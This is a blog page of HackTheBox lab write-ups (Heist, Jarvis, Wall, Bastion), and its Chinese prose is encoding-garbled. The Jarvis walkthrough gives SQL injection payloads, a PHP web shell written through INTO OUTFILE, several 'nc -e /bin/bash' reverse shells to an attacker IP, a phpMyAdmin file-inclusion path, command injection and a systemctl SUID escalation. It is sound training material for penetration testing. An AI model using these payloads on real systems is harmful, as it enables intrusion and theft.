<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p <span class="string">"Q4)sJu\Y8qz*A3?d"</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126151024557.png" class="lazyload"></p>
<h1 id="å››ï¼Œææƒ"><a href="#å››ï¼Œææƒ" class="headerlink" title="å››ï¼Œææƒ"></a>å››ï¼Œææƒ</h1><p>ä¸€ç•ªæ¢ç´¢å å‘ç°æœ‰ <strong>firefox</strong> çš„ç¨‹åºå†è·‘<br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/2020012615214765.png" class="lazyload"><br>åˆ©ç”¨å¾®è½¯çš„procdumpæŠŠ firefoxçš„æ—¥å¿—</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></p>
<p>åˆ©ç”¨ evil-winrm ä¸Šä¼  procdump.exe ç„¶åæ‰§è¡Œ</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">upload proxdump.exe</span><br><span class="line">procdump -ma 2892</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure>

<p>åé¢ç”¨ grep æ‰¾å‡ºadmin åå‘ç°å¯†ç ã€‚<br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126170033546.png" class="lazyload"><br>ä½¿ç”¨evil win-rm ç™»é™†å å–åˆ° root flag</p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/26/HTB-Heist/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/22/HTB-jarvis/">HTB Jarvis Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 22, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<blockquote>
<p>æŒºæœ‰æ„æ€çš„ä¸€å°æœºå™¨ï¼Œæœ‰æŒºå¤šç§æ–¹å¼æ‹¿ low priv shellã€‚</p>
</blockquote>
<p>æ”»å‡»æœºï¼šå®˜æ–¹Kali linux 2019 64ä½<br>ä½œè€…ï¼š<strong>Ikonw</strong></p>
<h1 id="é¶æœºä»‹ç»"><a href="#é¶æœºä»‹ç»" class="headerlink" title="é¶æœºä»‹ç»"></a>é¶æœºä»‹ç»</h1><p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122113820431.png" class="lazyload"></p>
<h1 id="ä¸€ï¼Œç«¯å£æ‰«æ"><a href="#ä¸€ï¼Œç«¯å£æ‰«æ" class="headerlink" title="ä¸€ï¼Œç«¯å£æ‰«æ"></a>ä¸€ï¼Œç«¯å£æ‰«æ</h1><p>åªæœ‰HTTP æ¯”è¾ƒæœ‰å…´è¶£ï¼Œtitle æ˜¯ <strong>Stark Hotel</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 11:48 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> jarvis.htb (10.10.10.143)</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span><br><span class="line">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span><br><span class="line">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:<span class="built_in">cd</span>:c8:15:3a:c3:69:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">123456789101112131415161718</span><br></pre></td></tr></tbody></table></figure>

<h1 id="äºŒï¼ŒHTTP-Enumeration"><a href="#äºŒï¼ŒHTTP-Enumeration" class="headerlink" title="äºŒï¼ŒHTTP Enumeration"></a>äºŒï¼ŒHTTP Enumeration</h1><p>ç¬¬ä¸€ä¸ªä¹ æƒ¯å°±æ˜¯å…ˆæŠŠgobuster ä¸Šèµ·æ¥</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w directory-list-2.3-medium.txt -u 10.10.10.143 -t 50</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122115946864.png" class="lazyload"><br>å‘ç°æœ‰ <strong>phpmyadmin</strong><br>ç»è¿‡ä¸€ç•ªå°è¯•ï¼Œdefault è´¦å·å’Œå¯†ç éƒ½æ— æ•ˆã€‚æš‚æ—¶å…ˆè·³è¿‡ã€‚</p>
<p>ç»§ç»­æµè§ˆ stark hotel(é’¢é“ä¾ çˆ±å¥½è€…ï¼Œstark å’Œ jarvis)</p>
<p>åœ¨ç½‘é¡µä¸Šå‘ç°å‡ å¤„å¯ç–‘çš„åŸŸå</p>
<p><strong>supersecurehotel.htb</strong><br><strong>logger.htb</strong></p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/2020012212053773.png" class="lazyload"><br>å°è¯•ç€åŠ è¿›å» <strong>/etc/hosts</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">10.10.10.143 jarvis.htb supersecurehotel@logger.htb supersecurehotel.htb logger.htb</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>ç„¶ååˆ†åˆ«ç”¨ jarvis.htb, supersecurehotel.htb, logger.htb ç­‰åŸŸåè¿›è¡Œè®¿é—®ã€‚ ç»“æœè¿˜æ˜¯è·Ÿä¹‹å‰ä¸€æ ·çš„ å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚æˆ‘ä»¬æ¥ç€æ¢ç´¢ã€‚</p>
<p>ä¸€é¡¿èƒ¡ä¹±ç‚¹å‡»å å‘ç° <strong>room.php</strong> æœ‰å¯ç–‘<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122121012113.png" class="lazyload"><br>å°è¯•åŠ ä¸ªåŒå¼•å·å¼•å· <strong>â€œ</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1<span class="string">"</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>æœç„¶æŠ¥é”™äº†<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122121923813.png" class="lazyload"><br>ä¸‹ä¸€æ­¥ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ ORDER BY æˆ–è€… UNION SELECTæ¥æ‰¾å‡ºæŸ¥è¯¢è¯­å¥æœ‰å‡ ä¸ªå­—æ®µã€‚</p>
<p><strong>ORDER BY</strong></p>
<p>é¦–å…ˆä½¿ç”¨orderbyå­å¥æ¥ç¡®å®šSQLè¯­å¥æŸ¥è¯¢çš„å­—æ®µæ•°é‡ã€‚orderbyå­å¥ä¼šæ ¹æ®sqlæŸ¥è¯¢ç»“æœçš„å­—æ®µæ¥æ’åºï¼Œå¦‚æœå­—æ®µä¸å­˜åœ¨åˆ™ä¼šæŠ¥é”™ã€‚</p>
<p>å¯ä»¥å…ˆä»10 å¼€å§‹è¯•</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1 ORDER BY 10</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>é¡µé¢æ˜¾ç¤ºåå¸¸ï¼Œä»£è¡¨æ²¡æœ‰10ä¸ªå­—æ®µï¼Œ ä¸€ä¸ªä¸€ä¸ªæ…¢æ…¢ä¸‹è¯•<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122122904597.png" class="lazyload"><br>è¯•åˆ°ç¬¬7çš„æ—¶å€™ é¡µé¢æ­£å¸¸è¿”å›</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1 ORDER BY 7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>ç¡®è®¤äº† æœ‰7ä¸ªå­—æ®µ<br>ç´§æ¥ç€ æˆ‘ä»¬èƒ½ä½¿ç”¨ UNION SELECTæ¥ç¡®å®šå›æ˜¾ä½</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,3,4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>å¯ä»¥ç¡®å®š 1 åº”è¯¥æ˜¯IDï¼Œæ‰€ä»¥æ²¡æœ‰æ˜¾ç¤ºã€‚<br>2 æ˜¯ è¯„åˆ†ç­‰çº§<br>3 æ˜¯ ä»·é’±<br>4 æ˜¯ ä»‹ç»<br>5 æ˜¯ å›¾ç‰‡<br>6 å’Œ 7 æ˜¯æœªçŸ¥ã€‚ å½“ç„¶è¿™äº›éƒ½ä¸é‡è¦ é‡è¦çš„æ˜¯ å›æ˜¾ä½æˆ‘ä»¬èƒ½çœ‹åˆ°ã€‚</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122123413127.png" class="lazyload"><br>å¯ä»¥åˆ©ç”¨mysqlçš„ä¸€äº›å‡½æ•°æ¥è·å–æ›´å¤šä¿¡æ¯ã€‚ æ¯”å¦‚database()<br>æ•°æ®åº“çš„åå­—å«<strong>hotel</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,database(),4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122140022261.png" class="lazyload"></p>
<h1 id="ä¸‰ï¼Œæ‹¿shell"><a href="#ä¸‰ï¼Œæ‹¿shell" class="headerlink" title="ä¸‰ï¼Œæ‹¿shell"></a>ä¸‰ï¼Œæ‹¿shell</h1><h5 id="æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹å¼æ¥æ‹¿åˆ°-www-dataã€‚"><a href="#æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹å¼æ¥æ‹¿åˆ°-www-dataã€‚" class="headerlink" title="æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹å¼æ¥æ‹¿åˆ° www-dataã€‚"></a>æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹å¼æ¥æ‹¿åˆ° www-dataã€‚</h5><p><strong>ä¸€ç§ä¸ºåˆ©ç”¨mysqlè¯»å†™çš„æ–¹å¼æ³¨å…¥phpæ‰§è¡Œnc</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE <span class="string">'file_name'</span></span><br><span class="line">1</span><br><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,<span class="string">'&lt;?php system("nc -e /bin/bash 10.10.14.10 1234");?&gt;'</span>,4,5,6,7 INTO OUTFILE <span class="string">'/var/www/html/malicious.php'</span></span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>ç„¶åæˆ‘ä»¬è®¿é—® <strong>10.10.10.143/malicious.php</strong><br>æˆåŠŸæ‹¿åˆ° shell<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122141038552.png" class="lazyload"></p>
<hr>
<p><strong>ç¬¬äºŒç§æ–¹å¼æ˜¯é€šè¿‡ mysqlå‡½æ•°å¯¼å‡º æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç  ç™»é™†phpmyadmin.</strong></p>
<p>ä½¿ç”¨ <strong>group_concat</strong> å¯ä»¥æŠŠ åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥,è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœ åˆ©ç”¨ <strong>â€œ:â€</strong> æ¥éš”ç¦»åˆ†å¼€</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">room</span>.php?cod=<span class="number">999</span> union select <span class="number">1</span>,<span class="number">2</span>,(select group_concat(user,<span class="string">":"</span>,password,<span class="string">":"</span>,host) from mysql.user),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span></span><br><span class="line"><span class="attribute">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬æˆåŠŸå–å¾— æ•°æ®åº“çš„è´¦å·å’Œå¯†ç å“ˆå¸Œå€¼</p>
<p><strong>Dbadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</strong><br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122141541617.png" class="lazyload"><br>åˆ©ç”¨ crackstation.net æ¥è¿›è¡Œç ´è§£å“ˆå¸Œå€¼<br><img src="/images/placeholder.png" alt="img" data-src="/images/old-machine-images/20200122141930255.png" class="lazyload"><br>å¾—åˆ°å¯†ç  <strong>imissyou</strong></p>
<p>æ‰¾å›ä¹‹å‰çš„ phpmyadmin ç™»é™†åå‘ç°<br><strong>Apache/2.4.25</strong><br><strong>phpmyadmin 4.8.0</strong><br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/2020012214211048.png" class="lazyload"><br>æ–‡ç« å‘è¡¨çš„æ—¶å€™ phpmyadmin æœ€æ–°çš„ç‰ˆæœ¬ä¸º 5.0.1<br>ä¸€ç•ªsearchsploitåå‘ç° 4.8.0å’Œ4.8.1 ç‰ˆæœ¬æœ‰è¿œç¨‹æ‰§è¡Œæ–‡ä»¶åŒ…å«æ¼æ´</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44928">phpmyadmin 4.8 æ–‡ä»¶åŒ…å«æ¼æ´ä¼ é€é—¨</a></p>
<p>é¦–å…ˆ è¿è¡Œsqlå‘½ä»¤</p>
<figure class="highlight php-template"><table><tbody><tr><td class="code"><pre><span class="line"><span class="language-xml">select '</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">"nc -e /bin/bash 10.10.14.12 1234"</span>);<span class="meta">?&gt;</span></span><span class="language-xml">'</span></span><br><span class="line"><span class="language-xml">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122142927469.png" class="lazyload"><br>æ‹¿åˆ°sessionçš„æ•°å€¼<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122143910250.png" class="lazyload"><br>ç„¶åè¿›è¡Œè®¿é—®</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">10.10</span>.<span class="number">10.143</span><span class="regexp">/phpmyadmin/i</span>ndex.php?target=db_sql.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sessions/sess_b6uigkomnmk4oaa91ckc4chk4nfahaqi</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122143843553.png" class="lazyload"><br>æˆåŠŸï¼</p>
<h1 id="å››ï¼Œæé«˜ç”¨æˆ·æƒé™"><a href="#å››ï¼Œæé«˜ç”¨æˆ·æƒé™" class="headerlink" title="å››ï¼Œæé«˜ç”¨æˆ·æƒé™"></a>å››ï¼Œæé«˜ç”¨æˆ·æƒé™</h1><p>ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯è¯•è¯• sudo -l æœ‰æ²¡æœ‰ä»»ä½•å¯ä»¥åˆ©ç”¨çš„æƒé™ã€‚</p>
<figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">jarvis:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">jarvis:</span></span><br><span class="line">    (pepper : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /var/www/<span class="title class_">Admin</span>-<span class="title class_">Utilities</span>/simpler.py</span><br><span class="line"></span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></tbody></table></figure>

<p>è¿™æ˜¯ä¸€ä¸ªå°å‹çš„è­¦æŠ¥å™¨<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122144448439.png" class="lazyload"><br>ä»”ç»†çœ‹äº†æºä»£ç ï¼Œæœ‰ä¸€ä¸ªåœ°æ–¹å¯ä»¥ä½¿ç”¨å‘½ä»¤æ³¨å…¥ï¼Œè™½ç„¶åšäº†ç‚¹é»‘åå•æ¥è¿‡æ»¤ã€‚ ä½†æ˜¯ç”±äº <strong>$</strong> è¿˜èƒ½ä½¿ç”¨ã€‚ æˆ‘ä»¬å¯ä»¥ç”¨ç±»ä¼¼ <strong>$(cmd)</strong> çš„æ“ä½œã€‚</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122144636466.png" class="lazyload"></p>
<figure class="highlight nsis"><table><tbody><tr><td class="code"><pre><span class="line">sudo -u pepper /<span class="keyword">var</span>/www/<span class="literal">Admin</span>-Utilities/simpler.py -p</span><br><span class="line">Enter an IP: <span class="variable">$(bash)</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°pepperçš„shell<br>è¿™é‡Œä¸æ‡‚å‡ºäºä»€ä¹ˆåŸå›  æˆ‘å„ç§å‘½ä»¤å…¨éƒ¨éƒ½æ²¡å“åº”ã€‚äºæ˜¯æˆ‘ç”¨nc é‡æ–°ç”Ÿæˆäº†ä¸€ä¸ªshell<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145229923.png" class="lazyload"></p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">pepper</span>@jarvis:/$nc -e /bin/bash <span class="number">10.10.14.10</span> <span class="number">1234</span></span><br><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">10.10.14.10</span> <span class="number">1234</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">123</span></span><br></pre></td></tr></tbody></table></figure>

<p>äºæ˜¯æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°pepper çš„æƒé™<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145350946.png" class="lazyload"></p>
<h1 id="äº”ï¼ŒROOTææƒ"><a href="#äº”ï¼ŒROOTææƒ" class="headerlink" title="äº”ï¼ŒROOTææƒ"></a>äº”ï¼ŒROOTææƒ</h1><p>é¦–å…ˆæˆ‘ä»¬æ¥æŸ¥çœ‹SUID files</p>
<figure class="highlight arcade"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="number">-4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145847426.png" class="lazyload">å‘ç° <strong>systemctl</strong> æ¯”è¾ƒå¯ç–‘ã€‚<br>é€šè¿‡ <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/">gtfobins</a> å‘ç°å­˜åœ¨SUID æ¥è¿›è¡Œææƒçš„æ–¹æ³•ã€‚<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122150211702.png" class="lazyload"><br>ä¸€èˆ¬çœ‹åˆ°è¿™ç§æˆ‘éƒ½æ¯”è¾ƒå–œæ¬¢æ‰‹åŠ¨æ“ä½œã€‚<br>åˆ›å»ºä¸€ä¸ª pwn.service åœ¨ pepper çš„ä¸»ç›®å½•é‡Œ å¹¶ä¸”æŠŠ ExecStart æŒ‡å‘ nc.sh</p>
<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line"><span class="attribute">Type</span>=oneshot</span><br><span class="line"><span class="attribute">ExecStart</span>=/home/pepper/nc.sh</span><br><span class="line">[Install]</span><br><span class="line"><span class="attribute">WantedBy</span>=multi-user.target</span><br><span class="line"></span><br><span class="line">123456</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">nc -e /bin/bash 10.10.14.10 1234</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></tbody></table></figure>

<p>ç„¶åæˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ª symlink èµ·æ¥</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">link</span> /home/pepper/pwn.service</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>æ‰“å¼€ nc æ¥å¬<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122151106368.png" class="lazyload"></p>
<p>ç„¶åå¯åŠ¨æˆ‘ä»¬çš„pwnæœåŠ¡</p>
<figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> pwn</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°root<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122151239547.png" class="lazyload"></p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/22/HTB-jarvis/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/13/HTB-wall/">HTB Wall Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 13, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		
			<p>è¿™å°æœºå™¨æ¯”è¾ƒæœ‰æ„æ€ï¼Œæ­£å¦‚åå­— æœ‰ä¸€é“â€œå¢™â€ã€‚æœ‰è¶£çš„æ˜¯è¿™å°æœºå™¨çš„CMS CVEå’Œæœºå™¨çš„ä½œè€…æ˜¯åŒä¸€ä¸ªäººã€‚<br>ä½œè€…å°½é‡å†™å‡ºè‡ªå·±åœ¨é‡åˆ°é—®é¢˜çš„æ—¶å€™ç¢°åˆ°çš„å‘ ä»¥åŠåšäº†ä»€ä¹ˆå°è¯•å’Œæ€è·¯ã€‚</p>
		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/13/HTB-wall/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/10/HTB-bastion/">HTB Bastion Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 10, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p>æ”»å‡»æœºï¼šå®˜æ–¹Kali linux 2019 64ä½<br>ä½œè€…: <strong>Ikonw</strong></p>
<p><img src="/images/placeholder.png" alt="image-20200924210807049" data-src="/images/HTB-bastion/image-20200924210807049.png" class="lazyload"></p>
<h2 id="ä¸€ï¼Œç«¯å£æ‰«æ"><a href="#ä¸€ï¼Œç«¯å£æ‰«æ" class="headerlink" title="ä¸€ï¼Œç«¯å£æ‰«æ"></a>ä¸€ï¼Œç«¯å£æ‰«æ</h2><p><img src="/images/placeholder.png" alt="image-20200924210826254" data-src="/images/HTB-bastion/image-20200924210826254.png" class="lazyload"></p>
<p>æ­£å¸¸çš„nmapç«¯å£æ‰«æ æ²¡æœ‰å¤ªå¤šçš„èµ„è®¯ï¼Œåªæœ‰SMBå’ŒSSH å¼€ç€ã€‚</p>
<h2 id="äºŒï¼ŒSMB-Enumeration"><a href="#äºŒï¼ŒSMB-Enumeration" class="headerlink" title="äºŒï¼ŒSMB Enumeration"></a>äºŒï¼ŒSMB Enumeration</h2><p>é¦–å…ˆï¼Œåˆ©ç”¨smbclient è¿æ¥åˆ°é¶æœº<br>æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œ smbmapä¹‹ç±»çš„ ä½†æˆ‘æ¯”è¾ƒå–œæ¬¢ç”¨ç®€å•çš„smbclient.<br>smbmapç­‰å…¶ä»–å·¥å…·åœ¨çœŸå®ç¯å¢ƒé‡Œ ä¼šè‡ªåŠ¨è¿›è¡Œå¤§é‡æ“ä½œï¼Œå¾ˆå®¹æ˜“è¢«æ—¥å¿—æ•æ‰ä¸‹æ¥ã€‚</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient -L //10.10.10.134</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="image-20200924210848265" data-src="/images/HTB-bastion/image-20200924210848265.png" class="lazyload"></p>
<p>å‘ç°å››ä¸ªç›®æ ‡ï¼Œå…¶ä¸­ä¸‰ä¸ªæ˜¯æ¯”è¾ƒæ­£å¸¸ã€‚<br>æœ‰æ„æ€çš„æ˜¯ <strong>Backups</strong></p>
<p>æˆ‘ä»¬åˆ©ç”¨smbclient çœ‹çœ‹æ˜¯å¦å…è®¸æˆ‘ä»¬è¿æ¥åˆ° <strong>Backups</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.10.134\\Backups</span><br></pre></td></tr></tbody></table></figure>

<p>è¿™é‡Œåˆ©ç”¨â€â€æ¥ é€ƒè„± â€œâ€ æ‰€ä»¥éœ€è¦4ä¸ªï¼Œè€Œbackup ä¸¤ä¸ªã€‚</p>
<p><img src="/images/placeholder.png" alt="image-20200924210918572" data-src="/images/HTB-bastion/image-20200924210918572.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" alt="asd" data-src="/images/HTB-bastion/2020011001300488.png" class="lazyload"></p>
<p>æˆåŠŸè¿›å…¥ï¼Œå‘ç°ä¸‰ä¸ªæ–‡ä»¶ã€‚åˆ©ç”¨ <strong>get</strong> æŠŠ <strong>note.txt</strong> ä¸‹è½½åˆ°æœ¬åœ°ã€‚<br>å¤§æ¦‚çš„æ„æ€å°±æ˜¯ ç³»ç»Ÿç®¡ç†å‘˜å»ºè®®ä¸è¦æŠŠæ•´ä¸ªbackup æ–‡ä»¶å¤¹ä¸‹è½½åˆ°æœ¬åœ°ã€‚<br>æŒ‰ç…§æ–‡ä»¶å¤¹çš„åå­—æ¥çœ‹ï¼Œåº”è¯¥æ˜¯windowsé•œåƒçš„å¤‡ä»½ã€‚</p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110013425912.png" class="lazyload"></p>
<p>äºæ˜¯æˆ‘å°è¯•å°†æ•´ä¸ªbackupéƒ½æŒ‚è½½åˆ°æœ¬åœ°ã€‚<br>åœ¨æœ¬åœ°åˆ›å»ºæ–‡ä»¶å¤¹ <strong>/mnt/backup</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">mount -t cifs //10.10.10.134/Backups /mnt/backup -o rw</span><br></pre></td></tr></tbody></table></figure>

<p>æŒ‚è½½åˆ°æœ¬åœ°å¹¶ä¸”å…è®¸è¯»å†™æ“ä½œ</p>
